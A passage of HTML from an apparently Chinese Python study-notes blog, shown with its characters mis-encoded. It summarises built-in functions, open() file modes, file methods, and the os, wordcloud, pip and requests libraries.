src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200202141611146.png" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200202171711002.png" style="zoom: 40%;" loading="lazy"><h2 id="id"><a href="#id" class="headerlink" title="id()"></a>id()</h2><p><strong>id()</strong> å‡½æ•°è¿”å›å¯¹è±¡çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œæ ‡è¯†ç¬¦æ˜¯ä¸€ä¸ªæ•´æ•°ã€‚</p><p>CPython ä¸­ <strong>id()</strong> å‡½æ•°ç”¨äºè·å–å¯¹è±¡çš„å†…å­˜åœ°å€ã€‚</p><p>è¯­æ³•ï¼š<code>id([object])</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406162510638.png" alt loading="lazy"></p><h2 id="type"><a href="#type" class="headerlink" title="type()"></a>type()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200215100705983.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406163544027.png" alt loading="lazy"></p><h2 id="isinstance"><a href="#isinstance" class="headerlink" title="isinstance()"></a>isinstance()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200215145928773.png" alt loading="lazy"></p><h2 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h2><p><a href="https://www.runoob.com/python/file-methods.html">å‚è€ƒ</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200216104144396.png" style="zoom:80%;" loading="lazy"><h2 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200415104107118.png" alt loading="lazy"></p><h2 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h2><p><a href="https://www.jianshu.com/p/6c33bd958f3d">å‚è€ƒ</a></p><p>mode å‚æ•°æœ‰ï¼š</p><table><thead><tr><th align="center">æ¨¡å¼</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">t</td><td align="center">æ–‡æœ¬æ¨¡å¼ (é»˜è®¤)ã€‚</td></tr><tr><td align="center">x</td><td align="center">å†™æ¨¡å¼ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™ä¼šæŠ¥é”™ã€‚</td></tr><tr><td align="center">b</td><td align="center">äºŒè¿›åˆ¶æ¨¡å¼ã€‚</td></tr><tr><td align="center">+</td><td align="center">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œæ›´æ–°(å¯è¯»å¯å†™)ã€‚</td></tr><tr><td align="center">U</td><td align="center">é€šç”¨æ¢è¡Œæ¨¡å¼ï¼ˆä¸æ¨èï¼‰ã€‚</td></tr><tr><td align="center">r</td><td align="center">ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚</td></tr><tr><td align="center">rb</td><td align="center">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºåªè¯»ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚è¿™æ˜¯é»˜è®¤æ¨¡å¼ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td></tr><tr><td align="center">r+</td><td align="center">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚</td></tr><tr><td align="center">rb+</td><td align="center">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚æ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td></tr><tr><td align="center">w</td><td align="center">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td></tr><tr><td align="center">wb</td><td align="center">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶åªç”¨äºå†™å…¥ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td></tr><tr><td align="center">w+</td><td align="center">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚</td></tr><tr><td align="center">wb+</td><td align="center">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚</td></tr><tr><td align="center">a</td><td align="center">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚</td></tr><tr><td align="center">ab</td><td align="center">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚</td></tr><tr><td align="center">a+</td><td align="center">æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚æ–‡ä»¶æ‰“å¼€æ—¶ä¼šæ˜¯è¿½åŠ æ¨¡å¼ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚</td></tr><tr><td align="center">ab+</td><td align="center">ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚</td></tr></tbody></table><p>é»˜è®¤ä¸ºæ–‡æœ¬æ¨¡å¼ï¼Œå¦‚æœè¦ä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€ï¼ŒåŠ ä¸Š <code>b</code> ã€‚</p><p>file å¯¹è±¡ä½¿ç”¨ open å‡½æ•°æ¥åˆ›å»ºï¼Œä¸‹è¡¨åˆ—å‡ºäº† file å¯¹è±¡å¸¸ç”¨çš„å‡½æ•°ï¼š</p><table><thead><tr><th align="center">åºå·</th><th align="center">æ–¹æ³•åŠæè¿°</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><a href="https://www.runoob.com/python/file-close.html"><code>file.close()</code></a>å…³é—­æ–‡ä»¶ã€‚å…³é—­åæ–‡ä»¶ä¸èƒ½å†è¿›è¡Œè¯»å†™æ“ä½œã€‚</td></tr><tr><td align="center">2</td><td align="center"><a href="https://www.runoob.com/python/file-flush.html"><code>file.flush()</code></a>åˆ·æ–°æ–‡ä»¶å†…éƒ¨ç¼“å†²ï¼Œç›´æ¥æŠŠå†…éƒ¨ç¼“å†²åŒºçš„æ•°æ®ç«‹åˆ»å†™å…¥æ–‡ä»¶, è€Œä¸æ˜¯è¢«åŠ¨çš„ç­‰å¾…è¾“å‡ºç¼“å†²åŒºå†™å…¥ã€‚</td></tr><tr><td align="center">3</td><td align="center"><a href="https://www.runoob.com/python/file-fileno.html"><code>file.fileno()</code></a>è¿”å›ä¸€ä¸ªæ•´å‹çš„æ–‡ä»¶æè¿°ç¬¦(file descriptor FD æ•´å‹), å¯ä»¥ç”¨åœ¨å¦‚osæ¨¡å—çš„readæ–¹æ³•ç­‰ä¸€äº›åº•å±‚æ“ä½œä¸Šã€‚</td></tr><tr><td align="center">4</td><td align="center"><a href="https://www.runoob.com/python/file-isatty.html"><code>file.isatty()</code></a>å¦‚æœæ–‡ä»¶è¿æ¥åˆ°ä¸€ä¸ªç»ˆç«¯è®¾å¤‡è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚</td></tr><tr><td align="center">5</td><td align="center"><a href="https://www.runoob.com/python/file-next.html"><code>file.next()</code></a>è¿”å›æ–‡ä»¶ä¸‹ä¸€è¡Œã€‚</td></tr><tr><td align="center">6</td><td align="center"><a href="https://www.runoob.com/python/python-file-read.html"><code>file.read([size])</code></a>ä»æ–‡ä»¶è¯»å–æŒ‡å®šçš„å­—èŠ‚æ•°ï¼Œå¦‚æœæœªç»™å®šæˆ–ä¸ºè´Ÿåˆ™è¯»å–æ‰€æœ‰ã€‚</td></tr><tr><td align="center">7</td><td align="center"><a href="https://www.runoob.com/python/file-readline.html"><code>file.readline([size])</code></a>è¯»å–æ•´è¡Œï¼ŒåŒ…æ‹¬ â€œ\nâ€ å­—ç¬¦ã€‚</td></tr><tr><td align="center">8</td><td align="center"><a href="https://www.runoob.com/python/file-readlines.html"><code>file.readlines([sizeint])</code></a>è¯»å–æ‰€æœ‰è¡Œå¹¶è¿”å›åˆ—è¡¨ï¼Œè‹¥ç»™å®šsizeint&gt;0ï¼Œåˆ™æ˜¯è®¾ç½®ä¸€æ¬¡è¯»å¤šå°‘å­—èŠ‚ï¼Œè¿™æ˜¯ä¸ºäº†å‡è½»è¯»å–å‹åŠ›ã€‚</td></tr><tr><td align="center">9</td><td align="center"><a href="https://www.runoob.com/python/file-seek.html"><code>file.seek(offset[, whence])</code></a>è®¾ç½®æ–‡ä»¶å½“å‰ä½ç½®</td></tr><tr><td align="center">10</td><td align="center"><a href="https://www.runoob.com/python/file-tell.html"><code>file.tell()</code></a>è¿”å›æ–‡ä»¶å½“å‰ä½ç½®ã€‚</td></tr><tr><td align="center">11</td><td align="center"><a href="https://www.runoob.com/python/file-truncate.html"><code>file.truncate([size])</code></a>æˆªå–æ–‡ä»¶ï¼Œæˆªå–çš„å­—èŠ‚é€šè¿‡sizeæŒ‡å®šï¼Œé»˜è®¤ä¸ºå½“å‰æ–‡ä»¶ä½ç½®ã€‚</td></tr><tr><td align="center">12</td><td align="center"><a href="https://www.runoob.com/python/python-file-write.html"><code>file.write(str)</code></a>å°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ï¼Œè¿”å›çš„æ˜¯å†™å…¥çš„å­—ç¬¦é•¿åº¦ã€‚</td></tr><tr><td align="center">13</td><td align="center"><a href="https://www.runoob.com/python/file-writelines.html"><code>file.writelines(sequence)</code></a>å‘æ–‡ä»¶å†™å…¥ä¸€ä¸ªåºåˆ—å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå¦‚æœéœ€è¦æ¢è¡Œåˆ™è¦è‡ªå·±åŠ å…¥æ¯è¡Œçš„æ¢è¡Œç¬¦ã€‚</td></tr></tbody></table><h1 id="ä¸€äº›åº“"><a href="#ä¸€äº›åº“" class="headerlink" title="ä¸€äº›åº“"></a>ä¸€äº›åº“</h1><h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><h3 id="OSåº“è·¯å¾„æ“ä½œ"><a href="#OSåº“è·¯å¾„æ“ä½œ" class="headerlink" title="OSåº“è·¯å¾„æ“ä½œ"></a>OSåº“è·¯å¾„æ“ä½œ</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200210121104519.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200210121210427.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200210121239874.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200210121259753.png" style="zoom:67%;" loading="lazy"><p>os.path.getsize(path)ï¼šè¿”å›pathå¯¹åº”æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½&gt;&gt;&gt;os.path.getsize(â€œc:/1.txtâ€)   â€”â€”&gt;   123</p><h3 id="OSåº“è¿›ç¨‹ç®¡ç†"><a href="#OSåº“è¿›ç¨‹ç®¡ç†" class="headerlink" title="OSåº“è¿›ç¨‹ç®¡ç†"></a>OSåº“è¿›ç¨‹ç®¡ç†</h3><p>os.system(command)â€”â€”â€”â€“æ‰§è¡Œç¨‹åºæˆ–å‘½ä»¤commandï¼Œåœ¨Windowsä¸­è¿”å›å€¼ä¸ºcmdçš„è°ƒç”¨è¿”å›ä¿¡æ¯</p><h3 id="OSåº“ç¯å¢ƒå‚æ•°"><a href="#OSåº“ç¯å¢ƒå‚æ•°" class="headerlink" title="OSåº“ç¯å¢ƒå‚æ•°"></a>OSåº“ç¯å¢ƒå‚æ•°</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200210122033256.png" style="zoom:67%;" loading="lazy"><table><thead><tr><th align="center">å‡½æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">os.getlogin()</td><td align="center">è·å¾—å½“å‰ç³»ç»Ÿç™»å½•ç”¨æˆ·åç§°</td></tr><tr><td align="center">os.cpu_count()</td><td align="center">è·å¾—å½“å‰ç³»ç»Ÿçš„CPUæ•°é‡</td></tr></tbody></table><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200210133215349.png" style="zoom:67%;" loading="lazy"><h2 id="wordcloud"><a href="#wordcloud" class="headerlink" title="wordcloud"></a>wordcloud</h2><p>é…ç½®å¯¹è±¡å‚æ•°â€”&gt;åŠ è½½è¯äº‘æ–‡æœ¬â€”&gt;è¾“å‡ºè¯äº‘æ–‡ä»¶</p><blockquote><p>åˆ†éš”ï¼šä»¥ç©ºæ ¼åˆ†éš”å•è¯</p><p>ç»Ÿè®¡ï¼šå•è¯å‡ºç°æ¬¡æ•°å¹¶è¿‡æ»¤</p><p>å­—ä½“ï¼šæ ¹æ®ç»Ÿè®¡é…ç½®å­—å·</p><p>å¸ƒå±€ï¼šé¢œè‰²ç¯å¢ƒå°ºå¯¸</p></blockquote><table><thead><tr><th align="center">æ–¹æ³•</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">w.generate(txt)</td><td align="center">å‘WordCloudå¯¹è±¡wä¸­åŠ è½½æ–‡æœ¬txt &gt;&gt;&gt;<code>w.generate(&quot;Python and WordCloud&quot;)</code></td></tr><tr><td align="center">w.to_file(filename)</td><td align="center">å°†è¯äº‘è¾“å‡ºä¸ºå›¾åƒæ–‡ä»¶ï¼Œ<code>.png</code>æˆ–<code>.jpg</code>æ ¼å¼ &gt;&gt;&gt;<code>w.to_file(&quot;outfile.png&quot;)</code></td></tr></tbody></table><p>w.wordcloud.WordCloud()å‚æ•°ï¼š</p><table><thead><tr><th align="center">å‚æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">min_font_size</td><td align="center">æŒ‡å®šè¯äº‘ä¸­å­—ä½“çš„æœ€å°å­—ä½“ï¼Œé»˜è®¤4 &gt;&gt;&gt;w=wordcloud.WordCloud(min_font_size=10)</td></tr><tr><td align="center">max_font_size</td><td align="center">æŒ‡å®šè¯äº‘ä¸­å­—ä½“çš„æœ€å¤§å­—å·ï¼Œæ ¹æ®é«˜åº¦è‡ªåŠ¨è°ƒèŠ‚  &gt;&gt;&gt;w=wordcloud.WordCloud(max_font_size=20)</td></tr><tr><td align="center">font_step</td><td align="center">æŒ‡å®šè¯äº‘ä¸­å­—ä½“å­—å·çš„æ­¥è¿›é—´éš”ï¼Œé»˜è®¤ä¸º1 &gt;&gt;&gt;w=wordcloud.WordCloud(font_step=2)</td></tr><tr><td align="center">width</td><td align="center">æŒ‡å®šè¯äº‘å¯¹è±¡ç”Ÿæˆå›¾ç‰‡çš„å®½åº¦ï¼Œé»˜è®¤400åƒç´  &gt;&gt;&gt; w= wordcloud.WordCloud(width=600)</td></tr><tr><td align="center">height</td><td align="center">æŒ‡å®šè¯äº‘å¯¹è±¡ç”Ÿæˆå›¾ç‰‡çš„é«˜åº¦ï¼Œé»˜è®¤200åƒç´  &gt;&gt;&gt;w= wordcloud.WordCloud(width=400)</td></tr><tr><td align="center">font_path</td><td align="center">æŒ‡å®šå­—ä½“æ–‡ä»¶çš„è·¯å¾„ï¼Œé»˜è®¤None &gt;&gt;&gt; w=wordcloud.WordCloud(font_path=â€msyh.ttcâ€)</td></tr><tr><td align="center">max-words</td><td align="center">æŒ‡å®šè¯äº‘æ˜¾ç¤ºçš„æœ€å¤§å•è¯æ•°é‡ï¼Œé»˜è®¤200 &gt;&gt;&gt; w= wordcloud.WordCloud(max_words=20)</td></tr><tr><td align="center">stop_word</td><td align="center">æŒ‡å®šè¯äº‘çš„æ’é™¤åˆ—è¡¨ï¼Œå³ä¸æ˜¾ç¤ºå•è¯åˆ—è¡¨&gt;&gt;&gt; w= wordcloud.WordCloud(stop_words={â€œPythonâ€})</td></tr><tr><td align="center">mask</td><td align="center">æŒ‡å®šè¯äº‘å½¢çŠ¶ï¼Œé»˜è®¤ä¸ºé•¿æ–¹å½¢ï¼Œéœ€è¦å¼•ç”¨imread()å‡½æ•°&gt;&gt;&gt;from scipy.misc import imread &gt;&gt;&gt; mk = imread(â€œpic.pngâ€) &gt;&gt;&gt; w = wordcloud.WordCloud(mask=mk)</td></tr><tr><td align="center">background_color</td><td align="center">æŒ‡å®šè¯äº‘å›¾ç‰‡çš„èƒŒæ™¯é¢œè‰²ï¼Œé»˜è®¤ä¸ºçº¢é»‘è‰² &gt;&gt;&gt; w= wordcloud.WordCloud(background_color=â€whiteâ€)</td></tr></tbody></table><h2 id="PyInstaller"><a href="#PyInstaller" class="headerlink" title="PyInstaller"></a>PyInstaller</h2><p>æ‰“åŒ….pyæ–‡ä»¶ä¸º.exeåº”ç”¨ç¨‹åº</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/pythonç¬”è®°/image-20200205161232599.png" style="zoom:67%;" loading="lazy"><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><table><thead><tr><th align="center">ä½¿ç”¨æ–¹æ³•</th><th align="center">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="center">pip install &lt;ç¬¬ä¸‰æ–¹åº“å&gt;</td><td align="center">å®‰è£…ç¬¬ä¸‰æ–¹åº“</td></tr><tr><td align="center">pip install -U &lt;ç¬¬ä¸‰æ–¹åº“å&gt;</td><td align="center">æ›´æ–°ç¬¬ä¸‰æ–¹åº“</td></tr><tr><td align="center">pip uninstall &lt;ç¬¬ä¸‰æ–¹åº“å&gt;</td><td align="center">å¸è½½ç¬¬ä¸‰æ–¹åº“</td></tr><tr><td align="center">pip download &lt;ç¬¬ä¸‰æ–¹åº“å&gt;</td><td align="center">ä¸‹è½½ä½†ä¸å®‰è£…æŒ‡å®šçš„ç¬¬ä¸‰æ–¹åº“</td></tr><tr><td align="center">pip show &lt;ç¬¬ä¸‰æ–¹åº“å&gt;</td><td align="center">åˆ—å‡ºæŸä¸ªæŒ‡å®šç¬¬ä¸‰æ–¹åº“çš„è¯¦ç»†ä¿¡æ¯</td></tr><tr><td align="center">pip search &lt;å…³é”®å­—&gt;</td><td align="center">æ ¹æ®å…³é”®è¯åœ¨åç§°å’Œä»‹ç»ä¸­æœç´¢ç¬¬ä¸‰æ–¹åº“</td></tr><tr><td align="center">pip list</td><td align="center">åˆ—å‡ºå½“å‰ç³»ç»Ÿçš„pythonç‰ˆæœ¬å·²ç»å®‰è£…çš„ç¬¬ä¸‰æ–¹åº“</td></tr></tbody></table><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><h3 id="ä¸»è¦æ–¹æ³•"><a href="#ä¸»è¦æ–¹æ³•" class="headerlink" title="ä¸»è¦æ–¹æ³•"></a>ä¸»è¦æ–¹æ³•</h3><table><thead><tr><th align="center">æ–¹æ³•</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">requests.requset(method,url,**kwargs)</td><td align="center">æ„é€ ä¸€ä¸ªè¯·æ±‚ï¼Œæ”¯æ’‘ä»¥ä¸‹å„æ–¹æ³•çš„åŸºç¡€æ–¹æ³•</td></tr><tr><td align="center">requests.get(url,params=None,**kwargs)</td><td align="center">è·å–HTMLç½‘é¡µçš„ä¸»è¦æ–¹æ³•ï¼Œå¯¹åº”äºHTTPçš„GET</td></tr><tr><td align="center">requests.head(url,**kwargs)</td><td align="center">è·å–HTMLç½‘é¡µå¤´ä¿¡æ¯çš„æ–¹æ³•ï¼Œå¯¹åº”äºHTTPçš„HEAD</td></tr><tr><td align="center">requests.post(url,data=None,json=None,**kwargs)</td><td align="center">å‘HTMLç½‘é¡µæäº¤POSTè¯·æ±‚çš„æ–¹æ³•ï¼Œå¯¹åº”äºHTTPçš„POST</td></tr><tr><td align="center">requests.put(url,data=None,**kwargs)</td><td align="center">å‘HTMLç½‘é¡µæäº¤PUTè¯·æ±‚çš„æ–¹æ³•ï¼Œå¯¹åº”äºHTTPçš„PUT</td></tr><tr><td align="center">requests.patch(url,data=None,**kwargs)</td><td align="center">å‘HTMLç½‘é¡µæäº¤å±€éƒ¨ä¿®æ”¹è¯·æ±‚ï¼Œå¯¹åº”äºHTTPçš„PATCH</td></tr><tr><td align="center">requests.delete(url,**kwargs)</td><td align="center">å‘HTMLé¡µé¢æäº¤åˆ é™¤è¯·æ±‚ï¼Œå¯¹åº”äºHTTPçš„DELETE</td></tr></tbody></table><p>methodï¼š</p><blockquote><p>è¯·æ±‚æ–¹å¼ï¼ŒGET,HEAD,POST,PUT,PATCH,DALETE,OPTIONS</p></blockquote><p>**kwargsï¼š</p><p>æ§åˆ¶è®¿é—®çš„å‚æ•°ï¼Œå‡ä¸ºå¯é€‰é¡¹</p><blockquote><p>paramsï¼šå­—å…¸æˆ–å­—èŠ‚åºåˆ—ï¼Œä½œä¸ºå‚æ•°å¢åŠ åˆ°urlä¸­</p><p>dataï¼šå­—å…¸ã€å­—èŠ‚åºåˆ—æˆ–æ–‡ä»¶å¯¹è±¡ï¼Œä½œä¸ºRequestçš„å†…å®¹</p><p>jsonï¼šJSONæ ¼å¼çš„æ•°æ®ï¼Œä½œä¸ºRequestçš„å†…å®¹</p><p>headersï¼šå­—å…¸ï¼ŒHTTPå®šåˆ¶å¤´</p><p>cookiesï¼šå­—å…¸æˆ–CookieJarï¼ŒRequestä¸­çš„cookie</p><p>authï¼šå…ƒç¥–ï¼Œæ”¯æŒHTTPè®¤è¯åŠŸèƒ½</p><p>filesï¼šå­—å…¸ç±»å‹ï¼Œä¼ è¾“æ–‡ä»¶</p><p>timeoutï¼šè®¾å®šè¶…æ—¶æ—¶é—´ï¼Œç§’ä¸ºå•ä½</p><p>proxiesï¼šå­—å…¸ç±»å‹ï¼Œè®¾å®šè®¿é—®ä»£ç†æœåŠ¡å™¨ï¼Œå¯ä»¥å¢åŠ ç™»å½•è®¤è¯</p><p>allow_redirectsï¼šTrue/Falseï¼Œé»˜è®¤ä¸ºTrueï¼Œé‡å®šå‘å¼€å…³</p><p>streamï¼šTrue/Falseï¼Œé»˜è®¤ä¸ºTrueï¼Œè·å–å†…å®¹ç«‹å³ä¸‹è½½å¼€å…³</p><p>verifyï¼šTrue/Falseï¼Œé»˜è®¤ä¸ºTrueï¼Œè®¤è¯SSLè¯ä¹¦å¼€å…³</p><p>certï¼šæœ¬åœ°SSLè¯ä¹¦è·¯å¾„</p></blockquote><h3 id="Requestsåº“çš„å¼‚å¸¸"><a href="#Requestsåº“çš„å¼‚å¸¸" class="headerlink" title="Requestsåº“çš„å¼‚å¸¸"></a>Requestsåº“çš„å¼‚å¸¸</h3><table><thead><tr><th align="center">å¼‚å¸¸</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">requests.ConnectionError</td><td align="center">ç½‘ç»œè¿æ¥é”™è¯¯å¼‚å¸¸ï¼Œå¦‚DNSæŸ¥è¯¢å¤±è´¥ï¼Œæ‹’ç»è¿æ¥ç­‰</td></tr><tr><td align="center">requests.HTTPError</td><td align="center">HTTPé”™è¯¯å¼‚å¸¸</td></tr><tr><td align="center">requests.URLRequired</td><td align="center">urlç¼ºå¤±å¼‚å¸¸</td></tr><tr><td align="center">requests.TooManyRedirects</td><td align="center">è¶…è¿‡æœ€å¤§é‡å®šå‘æ¬¡æ•°ï¼Œäº§ç”Ÿé‡å®šå‘å¼‚å¸¸</td></tr><tr><td align="center">requests.ConnectTimeout</td><td align="center">è¿æ¥è¿œç¨‹æœåŠ¡å™¨è¶…æ—¶å¼‚å¸¸</td></tr><tr><td align="center">requests.Timeout</td><td align="center">è¯·æ±‚URLè¶…æ—¶ï¼Œäº§ç”Ÿè¶…æ—¶å¼‚å¸¸</td></tr></tbody></table><h3 id="Responseå¯¹è±¡å±æ€§"><a href="#Responseå¯¹è±¡å±æ€§" class="headerlink" title="Responseå¯¹è±¡å±æ€§"></a>Responseå¯¹è±¡å±æ€§</h3><table><thead><tr><th align="center">å±æ€§</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">r.status_code</td><td align="center">HTTPè¯·æ±‚çš„è¿”å›çŠ¶æ€ï¼Œ200è¡¨ç¤ºè¿æ¥æˆåŠŸï¼Œ404è¡¨ç¤ºå¤±è´¥</td></tr><tr><td align="center">r.text</td><td align="center">HTTPå“åº”å†…å®¹çš„å­—ç¬¦ä¸²å½¢å¼ï¼Œå³ï¼Œurlå¯¹åº”çš„é¡µé¢å†…å®¹</td></tr><tr><td align="center">r.encoding</td><td align="center">ä»HTTP headerä¸­çŒœæµ‹çš„å“åº”å†…å®¹ç¼–ç æ–¹å¼</td></tr><tr><td align="center">r.apparent_encoding</td><td align="center">ä»å†…å®¹ä¸­åˆ†æå‡ºå“åº”å†…å®¹ç¼–ç çš„æ–¹å¼ï¼ˆå¤‡é€‰ç¼–ç æ–¹å¼ï¼‰</td></tr><tr><td 